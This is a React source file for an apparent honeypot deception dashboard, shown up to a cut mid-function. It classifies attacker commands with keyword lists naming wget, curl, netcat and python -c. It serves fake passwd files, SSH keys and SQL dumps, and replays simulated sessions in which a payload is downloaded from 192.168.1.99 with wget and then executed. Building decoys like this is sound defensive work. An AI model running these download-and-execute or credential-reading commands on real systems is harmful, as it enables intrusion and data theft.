import React, { useState, useEffect, useRef } from 'react';
import { 
  Terminal as TerminalIcon, Shield, Activity, Cpu, Play, 
  AlertTriangle, Crosshair, Network, FileWarning, TerminalSquare,
  Layers, Lock, Eye, Server, Award, Database, RefreshCw, CheckCircle2,
  Info, HelpCircle, Flame, Target, Compass, Search, ArrowUpDown, Trash2, Sliders,
  Pause, RotateCcw, FastForward
} from 'lucide-react';
import { LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, AreaChart, Area } from 'recharts';
import { motion, AnimatePresence } from 'framer-motion';

// --- Types ---
interface DeceptionEvent {
  id: number;
  timestamp: string;
  cmd: string;
  tactic: string;
  target: string;
  spoofedInfo: string;
  attackerResponse: string;
}

interface SessionCommand {
  cmd: string;
  out: string;
  tactic: string;
  target: string;
  spoofedInfo: string;
  attackerResponse: string;
  timestamp: string;
}

interface SessionRecord {
  id: string;
  name: string;
  timestamp: string;
  commands: SessionCommand[];
  sqsData: { time: number; sqs: number }[];
  isPreRecorded?: boolean;
}

// --- Backend Logic & Mock Data ---

function encodeCommand(command: string) {
  let hash = 0;
  for (let i = 0; i < command.length; i++) {
    hash = ((hash << 5) - hash) + command.charCodeAt(i);
    hash |= 0;
  }
  return Math.abs(hash) % 100;
}

function classifyCommand(command: string) {
  const cmd = command.toLowerCase().trim();
  const scanning = ["nmap", "nc ", "netcat", "masscan", "nikto"];
  const malware = ["wget", "curl", "./", "chmod", "scp", "tftp", "ftp", "python -c", "perl -e", "rm ", "sh "];
  const recon = ["ls", "pwd", "whoami", "cat", "uname", "ps", "ifconfig", "ip a", "netstat", "ss ", "id", "hostname", "find", "grep"];

  if (scanning.some(k => cmd.includes(k))) return 3;
  if (malware.some(k => cmd.includes(k))) return 2;
  if (recon.some(k => cmd.includes(k))) return 1;
  return 0; // normal
}

function mapActionName(action: number | null) {
  if (action === null) return "WAITING_FOR_INPUT";
  const m: Record<number, string> = {
    0: "NORMAL_EXECUTION",
    1: "LATENCY_INJECTION",
    2: "FAKE_ERROR",
    3: "FAKE_SUCCESS",
    4: "ENV_MODIFICATION",
  };
  return m[action] || "UNKNOWN";
}

function decideAction(state: { command_type: number }) {
  if (state.command_type === 3) return 1; // Scanner -> Inject Delay (Tarpit)
  if (state.command_type === 2) return 0; // Malware -> Execute in hypervisor sandbox
  if (state.command_type === 1) return 4; // Recon -> Environment alteration (Fake files)
  return 0;
}

// Detailed mapping of adversarial commands to their respective Decoy outcomes
function getDeceptionDetail(
  cmd: string, 
  downloadTamperMode: "CORRUPT_EOF" | "TRUNCATED_90" | "POISONED_HEADER" | "MOCK_SUCCESS",
  sensitiveFileSpoofMode: "RANDOM_SHARES_INCONSISTENCY" | "SIMULATED_LOG_INTRUSION" | "EXPIRED_SSH_BAIT" | "CORRUPTED_SQL_DUMP"
) {
  const c = cmd.toLowerCase().trim();
  
  // 1. Downloading files (wget / curl / scp / tftp)
  if (c.includes("wget") || c.includes("curl") || c.includes("scp") || c.includes("tftp")) {
    const url = cmd.split(" ").find(arg => arg.startsWith("http://") || arg.startsWith("https://")) || "http://192.168.1.99:8000/payload.sh";
    const filename = url.substring(url.lastIndexOf("/") + 1) || "payload.sh";

    if (downloadTamperMode === "CORRUPT_EOF") {
      return {
        tactic: "MUTATED_PAYLOAD_POISONING",
        target: "Malicious Dropper Download",
        spoofedInfo: `Injected a deliberate null-byte checksum mismatch at EOF of ${filename}. Real size simulated: 1024 bytes.`,
        attackerResponse: `The malware dropper fails to compile/run due to trailing block CRC error (integrity check failed), forcing the attacker to manually debug.`,
        overrideOut: `Connecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: '${filename}'\n\n     0K .                                                     100% 1.0M=0.001s\n\n2026-05-19T20:53:05 (1.0 MB/s) - '${filename}' saved [1024/1024]\n\n[WARNING] checksum integrity warning (CRC32 mismatch): Local calculated code blocks do not match raw channel signatures (File corrupted at EOF).`
      };
    } else if (downloadTamperMode === "TRUNCATED_90") {
      return {
        tactic: "DYNAMIC_FLOW_TRUNCATION",
        target: "Incomplete Dropper Fetch",
        spoofedInfo: `Artificially fractured TCP network socket at 90% of file stream. Dropped connection before EOF.`,
        attackerResponse: `Attacker download is halted abruptly. Terminal report indicates premature closure, leaving tool files content corrupted or half-empty.`,
        overrideOut: `Connecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: '${filename}'\n\n     0K .                                                      90% 1.0M=0.001s\n\ncurl: (18) transfer closed with 102 bytes remaining to read.\n[CONNECTION RESET BY PEER: INCOMPLETE BINARY OR SCRIPT RECONSTRUCTION]`
      };
    } else if (downloadTamperMode === "POISONED_HEADER") {
      return {
        tactic: "DECOY_INSTRUMENTATION_INJECT",
        target: "Instrumented Binary Serve",
        spoofedInfo: `Embedded hidden environment tracing headers and canary traps into the downloaded header script.`,
        attackerResponse: `Attacker triggers automated honeypot alarm code routines upon attempts to execute or read the poisoned file header.`,
        overrideOut: `Connecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: '${filename}'\n\n     0K .                                                     100% 1.0M=0.001s\n\n2026-05-19T20:53:05 (1.0 MB/s) - '${filename}' saved [1024/1024]\n[INFO] Injecting internal shadow monitoring telemetry hooks... Success.`
      };
    } else {
      // MOCK_SUCCESS
      return {
        tactic: "SANDBOX_ISOLATION_ECHO",
        target: "Regular Dropper Sandbox Download",
        spoofedInfo: `Faking TCP stream response 200 OK. Writing standard dropper payload bytes directly to transient memory filesystem.`,
        attackerResponse: `Download completes successfully. Attacker believes they saved a persistent binary to '/tmp/${filename}'.`,
        overrideOut: `--2026-05-10 17:32:00--  http://192.168.1.99:8000/payload.sh\nConnecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: 'payload.sh'\n\n     0K .                                                     100% 1.0M=0.001s\n\n2026-05-10 17:32:00 (1.0 MB/s) - 'payload.sh' saved [1024/1024]`
      };
    }
  }

  // 2. Sensitive files (cat /etc/passwd, cat /etc/shadow)
  if (c.includes("passwd") || c.includes("shadow")) {
    if (sensitiveFileSpoofMode === "RANDOM_SHARES_INCONSISTENCY") {
      return {
        tactic: "FS_INTEGRITY_SPOOF",
        target: "Identity Group Enumeration",
        spoofedInfo: `Presented custom /etc/passwd containing unprivileged user accounts assigned to superuser GID 0.`,
        attackerResponse: `Attacker notes UID/GID contradictions in the bait accounts, spending hours debugging privilege escalate vectors.`,
        overrideOut: `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndb_vault_sync:x:1021:0:Database Vault Sync Agent:/var/lib/db:/bin/bash\noperator:x:37:37:Operator:/var:/sbin/nologin\nmisaligned_user:x:1550:0::/home/misaligned:/bin/sh`
      };
    } else if (sensitiveFileSpoofMode === "SIMULATED_LOG_INTRUSION") {
      return {
        tactic: "HONEYTOKEN_SPELLING_TRAP",
        target: "Automated User Extraction",
        spoofedInfo: `Served user file seeded with typos ('db_vault_snyc') to filter out raw brute-force script scraping activity.`,
        attackerResponse: `Scraper extracts misspelled user logins; trying to login using these names locks out attacker IPs and speeds up threat scoring.`,
        overrideOut: `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndb_vault_snyc:x:1021:1021::/var/lib/db_sync:/bin/bash\nsecondary_audit_alert:x:1029:1029::/var/log/audit:/bin/false`
      };
    } else if (sensitiveFileSpoofMode === "EXPIRED_SSH_BAIT") {
      return {
        tactic: "EXPIRED_COGNITIVE_DECOY",
        target: "Obsolete Hash Extraction",
        spoofedInfo: `Injected bcrypt hashes for historically expired/disabled accounts (e.g., 'legacy_db_user').`,
        attackerResponse: `Intruder initiates heavy cracking against high-entropy synthetic keys, wasting heavy target CPU power for nothing.`,
        overrideOut: `root:x:0:0:root:/root:/bin/bash\nlegacy_db_admin:$6$rounds=50000$saltsalt$expiredhash1234fakefakefakefake:19200:0:99999:7:::\nbackup_steward:$6$invalid_or_expired_bcrypt_hash_pattern_deadbeef:19200:0:99999:7:::`
      };
    } else if (sensitiveFileSpoofMode === "CORRUPTED_SQL_DUMP") {
      return {
        tactic: "MALFORMED_FS_RESPONSE",
        target: "Damaged Database Index",
        spoofedInfo: `Served an /etc/passwd representation backed by broken characters and database binary chunk artifacts.`,
        attackerResponse: `Reader streams crash when parsing the system credentials, isolating automated reconnaissance programs instantly.`,
        overrideOut: `root:x:0:0:root:/root:/bin/bash\ndaemon:\x00\xff\x7f\x12\\CORRUPTED_SYS_BLOCK\\1:daemon:/usr/sbin:/usr/sbin/nologin\nERROR: read access violation on block sector 0x3f54`
      };
    }
  }

  // 3. Sensitive file lookups - SSH key private keys (id_rsa, rsa.bak)
  if (c.includes("id_rsa")) {
    if (sensitiveFileSpoofMode === "EXPIRED_SSH_BAIT") {
      return {
        tactic: "SSH_KEY_BAIT_CORRUPTION",
        target: "Credentials Exfiltration",
        spoofedInfo: `Injected expired decoy SSH key containing deliberate checksum base64 padding errors.`,
        attackerResponse: `Attacker exfiltrates key, but attempts to establish connection fail on client side ('Invalid Key Format/Padding' fault).`,
        overrideOut: `-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn\nNhAAAAAwEAAQAAAADAALZ7G9N8mSpbN/G/k6Zp5n8O0e9b9J8K9XvL5q9Mno97r+9+u898\ny2Y9N60M++7o8vOa6r8u/L/v7/r+8M98y2Y9N60M++7o8vOa6r8u/L/v7/r+8M98y2Y9\n----- CORRUPTED END OF SSH KEY: UNALIGNED BASE64 PADDING -----\n[ERROR: INVALID PRIVATE KEY CHECK VALUE]`
      };
    } else if (sensitiveFileSpoofMode === "SIMULATED_LOG_INTRUSION") {
      return {
        tactic: "HONEY_METADATA_TUNNEL",
        target: "Traced Private Key Pull",
        spoofedInfo: `Served an SSH private key containing active tracing metadata tunnels embedded inside comments and payload blocks.`,
        attackerResponse: `Connecting with the key sends immediate canary handshake alerts carrying the attacker's client information to console logs.`,
        overrideOut: `-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn\nNhAAAAAwEAAQAAAADAALZ7G9N8mSpbN/G/k6Zp5n8O0e9b9J8K9XvL5q9Mno97r+9+u898\n# ID_TRACER: STUNNEL_PORT_22_METADATA_TRACKING_ACTIVE_MD\n-----END OPENSSH PRIVATE KEY-----`
      };
    } else if (sensitiveFileSpoofMode === "CORRUPTED_SQL_DUMP") {
      return {
        tactic: "MALFORMED_SSH_REPLY",
        target: "Damaged Key Vector",
        spoofedInfo: `Served an SSH key block which has parts overwritten by randomized raw hexadecimal backup byte sectors.`,
        attackerResponse: `Extruded key parsing fails in attacker tools with 'corrupted key structure' error messages, preventing rapid credentials reuse.`,
        overrideOut: `-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn\n[ !!! SEGMENT DEVIATION: SECTOR_FAULT READ EXCEEDED AT 0x7FFA !!! ]\n00000010: e58f 2a40 f322 1c00 77cc ab12 00ff 223c\n-----END OPENSSH PRIVATE KEY-----`
      };
    } else {
      return {
        tactic: "SSH_KEY_JAIL",
        target: "Private Key Extraction",
        spoofedInfo: `Serving an inactive simulated SSH key mapped inside our containment hypervisor zone.`,
        attackerResponse: `Attacker exfiltrates standard decoy key to try downstream ssh logins, allowing deep telemetry tracking.`,
        overrideOut: `-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn\nNhAAAAAwEAAQAAAADAALZ7G9N8mSpbN/G... [REDACTED KEY DATA] ...\n-----END OPENSSH PRIVATE KEY-----`
      };
    }
  }

  // 4. Sensitive Database Backups (backup.sql, prod_backup.sql, etc.)
  if (c.includes("backup.sql") || c.includes("backup")) {
    if (sensitiveFileSpoofMode === "CORRUPTED_SQL_DUMP") {
      return {
        tactic: "MALFORMED_DUMP_RESPONSE",
        target: "Damaged Database Dump",
        spoofedInfo: `Served SQL file corrupted by arbitrary PostgreSQL archiver EOF injection.`,
        attackerResponse: `PostgreSQL tools and exfiltrated SQL parsers crash on syntax alignment errors (unexpected end lines).`,
        overrideOut: `-- PostgreSQL database dump\n-- Dumped from database version 13.3\nCREATE TABLE core_vault (api_key VARCHAR(100), config TEXT);\nINSERT INTO core_vault VALUES ('prod_live_key_99ab', 'data_index_hash_f3);\n-- ERROR: pg_dump: [archiver] unexpected end of file mid-row insertion`
      };
    } else if (sensitiveFileSpoofMode === "SIMULATED_LOG_INTRUSION") {
      return {
        tactic: "DATABASE_BAIT_FEED",
        target: "Seeded SQL Keys Harvest",
        spoofedInfo: `Served a mock database dump featuring deliberate api key spelling drift ('apikey_snyc') and canary API tokens.`,
        attackerResponse: `Intruder tools parse bait tokens and trigger tracking systems when attempting validation calls against real cloud endpoints.`,
        overrideOut: `-- PostgreSQL database dump\nCREATE TABLE auth_keys (key_id INT, token_key TEXT);\nINSERT INTO auth_keys VALUES (32, 'prod_aws_key_snyc_88ab'); -- bait\nINSERT INTO auth_keys VALUES (33, 'prod_stripe_bypass_fake_e012');`
      };
    } else if (sensitiveFileSpoofMode === "EXPIRED_SSH_BAIT") {
      return {
        tactic: "EXPIRED_RESTORE_FEED",
        target: "Obsolete Row Inconsistencies",
        spoofedInfo: `Served SQL file containing rows marked with expired schema dates and deactivated token metadata.`,
        attackerResponse: `Attacker attempts automated logins with expired and closed API keys, exposing their active routing IPs.`,
        overrideOut: `-- PostgreSQL database dump\nCREATE TABLE keys_table (id INT, key TEXT, status TEXT);\nINSERT INTO keys_table VALUES (1, 'live_client_token_f9c2a', 'EXPIRED_2024');\nINSERT INTO keys_table VALUES (2, 'token_sandbox_key_ab394c', 'DEACTIVATED');`
      };
    } else {
      return {
        tactic: "SPOOFED_ENVIRONMENT_TREE",
        target: "Virtual Directory Dump",
        spoofedInfo: `Generates simulated standard production database SQL tables matching server parameters.`,
        attackerResponse: `Attacker saves raw SQL with random usernames and bcrypt keys into their capture logs.`,
        overrideOut: `-- PostgreSQL database dump\nCREATE TABLE system_users (id INT, user TEXT, pwd TEXT);\nINSERT INTO system_users VALUES (1, 'admin', 'md5f0e8f...');`
      };
    }
  }

  // 5. Normal Fallbacks
  if (c.includes("nmap") || c.includes("masscan")) {
    return {
      tactic: "DYNAMIC_TARPIT_LATENCY",
      target: "Automated Network Sweep",
      spoofedInfo: "Routing socket requests through dynamic delay queues. Emulating closed states on ports 1-1000 except SSH 22.",
      attackerResponse: "Scan is heavily rate-limited. Attacker scripts report socket timeouts and anomalous high network latency."
    };
  }
  if (c.includes("nc ") || c.includes("netcat")) {
    return {
      tactic: "MOCK_BANNER_SPOOFING",
      target: "Banner Grabbing Activity",
      spoofedInfo: "Serving outdated SSH-2.0-OpenSSH_7.4p1 Ubuntu-11 bait string. Logging packet timestamps & TTL signatures.",
      attackerResponse: "Attacker notes old SSH server version and initiates known vulnerabilities exploit sweep on safe dummy socket."
    };
  }
  if (c.includes("chmod") || c.includes("./") || c.includes("sh ") || c.includes("python")) {
    return {
      tactic: "SYNTHETIC_C2_LOOPBACK",
      target: "Trojan Dropper Execution",
      spoofedInfo: "Emulating active loopback listeners. Intercepting outgoing socket calls. Replying with randomized telemetry responses.",
      attackerResponse: "Dropper script starts, triggers artificial 'Connection to C2 server established' signal. Malware is safely quarantined."
    };
  }
  if (c.includes("whoami") || c.includes("id")) {
    return {
      tactic: "VIRTUAL_USER_SPOOF",
      target: "Identity Enumeration",
      spoofedInfo: "Faking superuser status 'root' (UID 0), while containment policy restricts session to jail boundary.",
      attackerResponse: "Attacker assumes full machine compromise and attempts complex privilege operations safely."
    };
  }
  if (c.includes("ls") || c.includes("pwd") || c.includes("find")) {
    return {
      tactic: "SPOOFED_ENVIRONMENT_TREE",
      target: "Directory & Credential Scan",
      spoofedInfo: "Generating false directory overlay. Showing mock DB backups ('prod_db_v3_backup.sql') mapped purely in virtual disk.",
      attackerResponse: "Attacker targets bait files for exfiltration, which triggers instantaneous deep alarm tracking."
    };
  }
  if (c.includes("rm ")) {
     return {
       tactic: "STATEFUL_DELETION_ECHO",
       target: "Anti-Forensics Cleansing",
       spoofedInfo: "Simulating disk removal event with fake success return. Preserving original file block metadata for forensic analysis.",
       attackerResponse: "Attacker reports traces wiped, unaware that their uploaded tools and commands are indexed in high-resolution logs."
     };
  }

  // Fallbacks by type
  const type = classifyCommand(cmd);
  if (type === 1) {
    return {
      tactic: "ENVIRONMENT_VIRTUALIZATION",
      target: "General System Reconnaissance",
      spoofedInfo: "Injecting false hardware structures, mock network interfaces, and unprivileged system configuration templates.",
      attackerResponse: "Recon software completes successfully with safe, high-entropy simulated parameters."
    };
  }
  if (type === 2) {
    return {
      tactic: "VIRTUAL_SANDBOX_TRAP",
      target: "Arbitrary Binary Execution",
      spoofedInfo: "Redirecting code execution hooks to temporary sandbox process container. Logging and dissecting binary logic.",
      attackerResponse: "System handles execution. Payload execution loops harmlessly inside constrained volatile container."
    };
  }
  if (type === 3) {
    return {
      tactic: "DYNAMIC_TARPIT_LATENCY",
      target: "Probing & Scanning",
      spoofedInfo: "Stalling response packets to enforce severe throughput caps on the scanning client.",
      attackerResponse: "Scanners lag behind, preventing rapid identification of server entry points."
    };
  }

  return {
    tactic: "MOCK_KERNEL_BYPASS",
    target: "Unclassified Operational Command",
    spoofedInfo: "Logging command vector and passing input to mock-filesystem jail without warning.",
    attackerResponse: "Awaiting next keyboard entry from the target terminal."
  };
}

const PROFILES: Record<string, CommandItem[]> = {
  scanner: [
    { cmd: "nmap -sS -p- 10.0.0.5", out: "Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for 10.0.0.5\nHost is up (0.0012s latency).\nNot shown: 65534 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh" },
    { cmd: "masscan -p1-65535 10.0.0.5 --rate=1000", out: "Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2026-05-10 17:30 GMT\nInitiating SYN Stealth Scan" },
    { cmd: "nc -vz 10.0.0.5 22", out: "Ncat: Version 7.80 ( https://nmap.org/ncat )\nNcat: Connected to 10.0.0.5:22.\nNcat: 0 bytes sent, 0 bytes received in 0.01 seconds." }
  ],
  malware: [
    { cmd: "wget http://192.168.1.99:8000/payload.sh", out: "--2026-05-10 17:32:00--  http://192.168.1.99:8000/payload.sh\nConnecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: 'payload.sh'\n\n     0K .                                                     100% 1.0M=0.001s\n\n2026-05-10 17:32:00 (1.0 MB/s) - 'payload.sh' saved [1024/1024]" },
    { cmd: "chmod +x payload.sh", out: "" },
    { cmd: "./payload.sh", out: "Extracting dropper...\nInstalling cron persistence...\nConnecting to C2...\n[+] Success" },
    { cmd: "rm payload.sh", out: "" }
  ],
  recon: [
    { cmd: "whoami", out: "root" },
    { cmd: "pwd", out: "/root" },
    { cmd: "cat /etc/passwd", out: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin" },
    { cmd: "ls -la", out: "total 12\ndrwx------  2 root root 4096 May 10 17:30 .\ndrwxr-xr-x 18 root root 4096 May 10 17:00 ..\n-rw-------  1 root root  204 May 10 17:28 .bash_history" }
  ]
};

const INITIAL_DECEPTION_EVENTS: DeceptionEvent[] = [
  {
    id: 1,
    timestamp: "14:26:02",
    cmd: "ssh root@10.0.0.5 -p 22",
    tactic: "VIRTUAL_SERVICE_JAIL",
    target: "Brute-Force Penetration",
    spoofedInfo: "Accepted root credentials using decoy login. Triggered hypervisor sandboxing sequence.",
    attackerResponse: "Authentication successful. Terminal session initialized inside container instance `cont_940`."
  },
  {
    id: 2,
    timestamp: "14:28:11",
    cmd: "uname -a",
    tactic: "SYS_SIGNATURE_SPOOF",
    target: "Host Operating System Audit",
    spoofedInfo: "Fed back standard static output template: Linux ubuntu 5.4.0-74-generic #83-Ubuntu x86_64.",
    attackerResponse: "Attacker registers kernel signature, planning local root exploit vectors targeting obsolete release."
  }
];

const PRE_RECORDED_SESSIONS: SessionRecord[] = [
  {
    id: "SESS-APT41",
    name: "APT-41 Identity Harvesting",
    timestamp: "2026-05-19 14:26:02",
    commands: [
      {
        cmd: "ssh root@10.0.0.5 -p 22",
        out: "SSH Connection Established. Host keys authorized.",
        tactic: "VIRTUAL_SERVICE_JAIL",
        target: "Brute-Force Penetration",
        spoofedInfo: "Accepted root credentials using decoy login. Triggered hypervisor sandboxing sequence.",
        attackerResponse: "Authentication successful. Terminal session initialized inside container instance `cont_940`.",
        timestamp: "14:26:02"
      },
      {
        cmd: "uname -a",
        out: "Linux ubuntu 5.4.0-74-generic #83-Ubuntu SMP Tue May 11 17:30:14 UTC 2026 x86_64 x86_64 GNU/Linux",
        tactic: "SYS_SIGNATURE_SPOOF",
        target: "Host Operating System Audit",
        spoofedInfo: "Fed back standard static output template: Linux ubuntu 5.4.0-74-generic.",
        attackerResponse: "Attacker registers kernel signature, planning local root exploit vectors targeting obsolete release.",
        timestamp: "14:28:11"
      },
      {
        cmd: "whoami",
        out: "root",
        tactic: "VIRTUAL_USER_SPOOF",
        target: "Identity Enumeration",
        spoofedInfo: "Faked superuser status 'root' (UID 0), while containment policy restricts session to jail boundary.",
        attackerResponse: "Attacker assumes full machine compromise and attempts complex privilege operations safely.",
        timestamp: "14:29:05"
      },
      {
        cmd: "cat /etc/passwd",
        out: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndb_vault_sync:x:1021:0:Database Vault Sync Agent:/var/lib/db:/bin/bash\noperator:x:37:37:Operator:/var:/sbin/nologin\nmisaligned_user:x:1550:0::/home/misaligned:/bin/sh",
        tactic: "FS_INTEGRITY_SPOOF",
        target: "Identity Group Enumeration",
        spoofedInfo: "Served identity list custom modified with misaligned groups to stimulate privilege elevation actions.",
        attackerResponse: "Attacker notes misaligned user GID 0 accounts and spends time searching for matching access vectors.",
        timestamp: "14:31:40"
      }
    ],
    sqsData: [
      { time: 0, sqs: 10 },
      { time: 1, sqs: 25 },
      { time: 2, sqs: 40 },
      { time: 3, sqs: 65 },
      { time: 4, sqs: 85 }
    ],
    isPreRecorded: true
  },
  {
    id: "SESS-VIPER",
    name: "Viper Ransomware Dropper",
    timestamp: "2026-05-19 15:11:43",
    commands: [
      {
        cmd: "wget http://192.168.1.99:8000/payload.sh",
        out: "Connecting to 192.168.1.99:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [application/x-sh]\nSaving to: 'payload.sh'\n\n     0K .                                                     100% 1.0M=0.001s\n\n2026-05-19T15:11:45 (1.0 MB/s) - 'payload.sh' saved [1024/1024]\n\n[WARNING] checksum integrity warning (CRC32 mismatch): Local calculated code blocks do not match raw channel signatures (File corrupted at EOF).",
        tactic: "MUTATED_PAYLOAD_POISONING",
        target: "Malicious Dropper Download",
        spoofedInfo: "Injected a deliberate null-byte checksum mismatch at EOF of payload.sh, raising integrity warnings.",
        attackerResponse: "The malware dropper fails to compile/run due to trailing block CRC error (integrity check failed), forcing the attacker to manually debug.",
        timestamp: "15:11:45"
      },
      {
        cmd: "chmod +x payload.sh",
        out: "",
        tactic: "STATEFUL_DELETION_ECHO",
        target: "Permission Change Logging",
        spoofedInfo: "Captured executable bit configuration in memory audit queue, keeping jail isolated.",
        attackerResponse: "Attacker assumes the system accepted execution privileges normally.",
        timestamp: "15:12:01"
      },
      {
        cmd: "./payload.sh",
        out: "[ERROR: INVALID SCRIPT CHECK VALUE AT LINE 42]\nTerminated execution block.",
        tactic: "VIRTUAL_SANDBOX_TRAP",
        target: "Arbitrary Binary Execution",
        spoofedInfo: "Simulated execution error on poisoned dropper script, preventing malware persistence.",
        attackerResponse: "Attacker receives script format errors, starting localized debugging inside hypervisor containment cage.",
        timestamp: "15:12:15"
      }
    ],
    sqsData: [
      { time: 0, sqs: 15 },
      { time: 1, sqs: 60 },
      { time: 2, sqs: 75 },
      { time: 3, sqs: 90 }
    ],
    isPreRecorded: true
  },
  {
    id: "SESS-BROKER",
    name: "ShadowBroker Credential Harvest",
    timestamp: "2026-05-19 16:40:55",
    commands: [
      {
        cmd: "pwd",
        out: "/root",
        tactic: "SPOOFED_ENVIRONMENT_TREE",
        target: "Directory & Credential Scan",
        spoofedInfo: "Served simulated active homedir.",
        attackerResponse: "Awaiting next keyboard entry from the target terminal.",
        timestamp: "16:40:55"
      },
      {
        cmd: "ls -la",
        out: "total 16\ndrwx------  3 root root 4096 May 19 16:41 .\ndrwxr-xr-x 18 root root 4096 May 19 16:00 ..\n-rw-------  1 root root  204 May 19 16:40 .bash_history\n-rw-r--r--  1 root root 1024 May 19 16:41 id_rsa.bak\n-rw-r--r--  1 root root 8192 May 19 16:41 prod_backup.sql",
        tactic: "SPOOFED_ENVIRONMENT_TREE",
        target: "Directory & Credential Scan",
        spoofedInfo: "Showed virtual SSH key backups and SQL database dumps.",
        attackerResponse: "Attacker spots backup storage file vectors and focuses reconnaissance on exfiltration scripts.",
        timestamp: "16:41:03"
      },
      {
        cmd: "cat id_rsa.bak",
        out: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn\nNhAAAAAwEAAQAAAADAALZ7G9N8mSpbN/G/k6Zp5n8O0e9b9J8K9XvL5q9Mno97r+9+u898\n# ID_TRACER: STUNNEL_PORT_22_METADATA_TRACKING_ACTIVE_MD\n-----END OPENSSH PRIVATE KEY-----",
        tactic: "HONEY_METADATA_TUNNEL",
        target: "Traced Private Key Pull",
        spoofedInfo: "Served an SSH private key containing active tracking headers and Canary callbacks.",
        attackerResponse: "Attacker exfiltrates telemetry-embedded SSH key, raising intrusion alert alarms across honeypot grid.",
        timestamp: "16:41:22"
      }
    ],
    sqsData: [
      { time: 0, sqs: 10 },
      { time: 1, sqs: 30 },
      { time: 2, sqs: 55 },
      { time: 3, sqs: 92 }
    ],
    isPreRecorded: true
  }
];

type CommandItem = { cmd: string; out: string };

export default function App() {
  const [profileQueue, setProfileQueue] = useState<CommandItem[]>([]);
  const [typingText, setTypingText] = useState("");
  const [terminalLog, setTerminalLog] = useState<{type: 'cmd'|'out', text: string}[]>([]);
  
  const [rlState, setRlState] = useState({
     num_commands: 2,
     time_alive: 129,
     unique_commands: 2,
     last_command: 34,
     repetitive: 0,
     command_type: 1
  });
  
  const [commandHistory, setCommandHistory] = useState<string[]>([]);
  const [currentAction, setCurrentAction] = useState<number | null>(null);
  const [sqsHistory, setSqsHistory] = useState<{time: number, sqs: number}[]>([{time: 0, sqs: 10}]);
  const [activeProfile, setActiveProfile] = useState<string | null>(null);

  // Honeypot Specific states
  const [deceptionEvents, setDeceptionEvents] = useState<DeceptionEvent[]>(INITIAL_DECEPTION_EVENTS);
  const [activeDeceptionTab, setActiveDeceptionTab] = useState<'illusion' | 'feed' | 'pipeline' | 'replay'>('illusion');
  
  // Session Replay/Recording state variables
  const [pastSessions, setPastSessions] = useState<SessionRecord[]>(PRE_RECORDED_SESSIONS);
  const [liveSessionCommands, setLiveSessionCommands] = useState<SessionCommand[]>([]);
  const [isReplaying, setIsReplaying] = useState<boolean>(false);
  const [replaySession, setReplaySession] = useState<SessionRecord | null>(null);
  const [replayCommandIndex, setReplayCommandIndex] = useState<number>(0);
  const [replaySpeed, setReplaySpeed] = useState<number>(1);
  const [replayIsPaused, setReplayIsPaused] = useState<boolean>(false);
  const [replayTypingText, setReplayTypingText] = useState<string>("");

  const [bytesSpoofed, setBytesSpoofed] = useState<number>(3124);
  const [sandboxContainment, setSandboxContainment] = useState<number>(100); // 100% isolated
  const [activeTrappingStep, setActiveTrappingStep] = useState<number>(0); // Interactive visual pipeline step (0 to 3)

  // Trapping customizer states
  const [downloadTamperMode, setDownloadTamperMode] = useState<"CORRUPT_EOF" | "TRUNCATED_90" | "POISONED_HEADER" | "MOCK_SUCCESS">("CORRUPT_EOF");
  const [sensitiveFileSpoofMode, setSensitiveFileSpoofMode] = useState<"RANDOM_SHARES_INCONSISTENCY" | "SIMULATED_LOG_INTRUSION" | "EXPIRED_SSH_BAIT" | "CORRUPTED_SQL_DUMP">("RANDOM_SHARES_INCONSISTENCY");

  // Sorting and Filtering States for the Audit Ledger Table
  const [logSearch, setLogSearch] = useState("");
  const [selectedTactic, setSelectedTactic] = useState("ALL");
  const [sortField, setSortField] = useState<keyof DeceptionEvent>("timestamp");
  const [sortDir, setSortDir] = useState<"asc" | "desc">("desc");

  // Get unique tactics for filtering
  const availableTactics = Array.from(new Set(deceptionEvents.map(e => e.tactic)));

  // Filter & Sort deceptionEvents
  const processedEvents = [...deceptionEvents]
    .filter(evt => {
      const matchSearch = 
        evt.cmd.toLowerCase().includes(logSearch.toLowerCase()) ||
        evt.tactic.toLowerCase().includes(logSearch.toLowerCase()) ||
        evt.target.toLowerCase().includes(logSearch.toLowerCase()) ||
